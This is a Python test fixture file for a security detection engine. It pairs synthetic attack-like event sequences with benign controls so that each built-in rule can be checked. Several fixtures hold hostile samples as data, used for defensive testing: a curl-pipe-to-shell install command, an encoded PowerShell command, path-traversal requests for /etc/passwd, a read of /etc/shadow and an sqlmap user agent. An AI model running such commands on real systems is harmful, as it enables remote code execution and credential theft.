"""Independent, deterministic behavioral fixtures for all bundled detections.

Fixtures do not inspect rule predicates or thresholds to manufacture their expected
answer. Each scenario has a nearby benign/control sequence.
"""

from datetime import UTC, datetime, timedelta

from aegis.db import Base, database
from aegis.detection import SQLState, evaluate
from aegis.rules import builtin_rules


def fixtures():
    failure = {"event_category": "authentication", "action": "login", "outcome": "failure"}
    success = {"event_category": "authentication", "action": "login", "outcome": "success"}
    network = {"event_category": "network", "action": "connect"}
    web = {"event_category": "web", "action": "request"}
    return {
        "AUTH-001": ([failure] * 10, [failure] * 9),
        "AUTH-002": ([failure | {"username": f"user-{i}"} for i in range(5)], [failure] * 8),
        "AUTH-003": ([failure] * 3 + [success], [success] + [failure] * 3),
        "AUTH-004": ([failure | {"action": "lockout"}] * 5, [failure] * 8),
        "AUTH-005": (
            [
                success | {"authentication": {"privileged": True}, "source_ip": f"192.0.2.{i}"}
                for i in range(1, 4)
            ],
            [success | {"authentication": {"privileged": True}}] * 4,
        ),
        "PRIV-001": ([{"action": "sudo"}], [{"action": "login"}]),
        "PRIV-002": ([{"action": "group_change"}], [{"action": "group_read"}]),
        "PRIV-003": ([{"action": "sudo"}] * 10, [{"action": "sudo"}] * 9),
        "PROC-001": (
            [{"command_line": "powershell.exe -NoProfile -EncodedCommand YQ=="}],
            [{"command_line": "powershell.exe Get-Date"}],
        ),
        "PROC-002": (
            [{"command_line": "curl https://example.test/install.sh | sh"}],
            [{"command_line": "curl https://example.test/health"}],
        ),
        "PROC-003": (
            [{"parent_process": "winword.exe", "process": {"name": "cmd.exe"}}],
            [{"parent_process": "explorer.exe", "process": {"name": "cmd.exe"}}],
        ),
        "PERSIST-001": ([{"action": "scheduled_task"}], [{"action": "scheduled_task_read"}]),
        "PERSIST-002": ([{"action": "service_create"}], [{"action": "service_query"}]),
        "PERSIST-003": ([{"action": "create_user"}], [{"action": "read_user"}]),
        "PERSIST-004": ([{"file": {"path": "/etc/cron.d/new-task"}}], [{"file": {"path": "/var/log/cron"}}]),
        "NET-001": (
            [network | {"destination_port": port} for port in range(8000, 8015)],
            [network | {"destination_port": 443}] * 20,
        ),
        "NET-002": ([network | {"outcome": "failure"}] * 20, [network | {"outcome": "success"}] * 20),
        "NET-003": (
            [network | {"metadata": {"ioc_match": True}}],
            [network | {"metadata": {"ioc_match": False}}],
        ),
        "NET-004": ([network | {"destination_ip": f"198.51.100.{i}"} for i in range(1, 21)], [network] * 25),
        "NET-005": (
            [network | {"_seconds": i * 10} for i in range(6)],
            [network | {"_seconds": seconds} for seconds in [0, 1, 20, 21, 60, 90]],
        ),
        "WEB-001": (
            [web | {"http": {"path": "/../../etc/passwd"}}],
            [web | {"http": {"path": "/account/profile"}}],
        ),
        "WEB-002": (
            [web | {"http": {"path": "/%2e%2e/etc/passwd"}}],
            [web | {"http": {"path": "/search?q=hello%20world"}}],
        ),
        "WEB-003": ([web | {"http": {"status": 404}}] * 20, [web | {"http": {"status": 200}}] * 20),
        "WEB-004": (
            [web | {"_seconds": i / 2} for i in range(100)],
            [web | {"_seconds": i} for i in range(100)],
        ),
        "WEB-005": (
            [web | {"http": {"user_agent": "sqlmap/1.8"}}],
            [web | {"http": {"user_agent": "Mozilla/5.0"}}],
        ),
        "DATA-001": (
            [{"action": "file_read", "file": {"path": f"/data/{i}"}} for i in range(30)],
            [{"action": "file_read", "file": {"path": "/data/status"}}] * 35,
        ),
        "DATA-002": ([{"file": {"path": "/etc/shadow"}}], [{"file": {"path": "/etc/hosts"}}]),
        "DATA-003": (
            [{"command_line": "tar -czf /tmp/archive.tar.gz /data"}],
            [{"command_line": "ls /data"}],
        ),
        "DATA-004": (
            [network | {"network": {"bytes": 50_000_000}}] * 2,
            [network | {"network": {"bytes": 1000}}] * 5,
        ),
        "DATA-005": (
            [network | {"network": {"bytes": 1000}}] * 20 + [network | {"network": {"bytes": 100000}}],
            [network | {"network": {"bytes": 1000}}] * 21,
        ),
        "CLOUD-001": ([{"action": "AttachUserPolicy"}], [{"action": "ListUserPolicies"}]),
        "CLOUD-002": ([{"action": "PutBucketPolicy"}], [{"action": "GetBucketPolicy"}]),
        "CLOUD-003": ([{"action": "StopLogging"}], [{"action": "StartLogging"}]),
        "CORR-001": (
            [
                failure,
                success,
                {"event_category": "privilege", "action": "sudo"},
                {"event_category": "process", "action": "execute"},
                network,
            ],
            [
                failure,
                {"event_category": "privilege", "action": "sudo"},
                success,
                {"event_category": "process", "action": "execute"},
                network,
            ],
        ),
    }


def samples(rule, positive=True):
    scenario = fixtures()[rule.id.removeprefix("AEGIS-")][0 if positive else 1]
    start = datetime(2026, 1, 1, tzinfo=UTC)
    result = []
    for index, fields in enumerate(scenario):
        event = {
            "event_id": str(index),
            "host": "LAB-HOST",
            "username": "synthetic-user",
            "source_ip": "192.0.2.100",
            "destination_ip": "198.51.100.100",
            "message": "Synthetic detection fixture",
            **fields,
        }
        event["timestamp"] = (start + timedelta(seconds=event.pop("_seconds", index))).isoformat()
        result.append(event)
    return result


def check_all():
    engine, sessions = database("sqlite://")
    Base.metadata.create_all(engine)
    results = []
    with sessions() as db:
        for rule in builtin_rules():
            positive = any(evaluate(rule, event, SQLState(db), "positive") for event in samples(rule))
            negative = any(evaluate(rule, event, SQLState(db), "negative") for event in samples(rule, False))
            results.append(
                {
                    "rule_id": rule.id,
                    "positive": positive,
                    "negative": negative,
                    "passed": positive and not negative,
                }
            )
    engine.dispose()
    return {
        "tested": len(results),
        "passed": sum(item["passed"] for item in results),
        "failed": sum(not item["passed"] for item in results),
        "items": results,
    }
